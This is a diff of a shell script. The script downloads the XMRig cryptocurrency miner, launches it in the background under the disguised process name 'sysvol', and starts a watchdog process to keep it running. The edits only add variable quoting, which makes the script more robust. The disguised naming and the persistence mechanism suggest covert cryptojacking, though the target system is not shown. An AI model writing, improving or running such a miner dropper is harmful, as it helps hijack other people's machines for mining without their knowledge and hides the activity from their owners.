@@ -16,11 +16,11 @@ sleep 1
 
 # Create structure
 echo "[+] Creating directories..."
-mkdir -p $BASE/{sbin,cfg,log,run}
+mkdir -p "$BASE"/{sbin,cfg,log,run}
 
 # Download XMRig
 echo "[+] Downloading XMRig v6.21.0..."
-cd $BASE
+cd "$BASE"
 wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O xmrig.tar.gz 2>/dev/null || curl -s -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
 
 echo "[+] Extracting..."
@@ -109,18 +109,18 @@ chmod +x run/watchdog.sh
 
 # Start miner
 echo "[+] Starting miner..."
-cd $BASE/sbin
+cd "$BASE/sbin"
 nohup ./sysvol > ../log/core.log 2>&1 &
 MINER_PID=$!
-echo $MINER_PID > ../run/miner.pid
+echo "$MINER_PID" > ../run/miner.pid
 
 sleep 3
 
 # Start watchdog (runs as separate background process)
 echo "[+] Starting watchdog..."
-nohup bash $BASE/run/watchdog.sh > $BASE/log/watchdog.log 2>&1 &
+nohup bash "$BASE/run/watchdog.sh" > "$BASE/log/watchdog.log" 2>&1 &
 WATCHDOG_PID=$!
-echo $WATCHDOG_PID > $BASE/run/watchdog.pid
+echo "$WATCHDOG_PID" > "$BASE/run/watchdog.pid"
 
 sleep 3
 
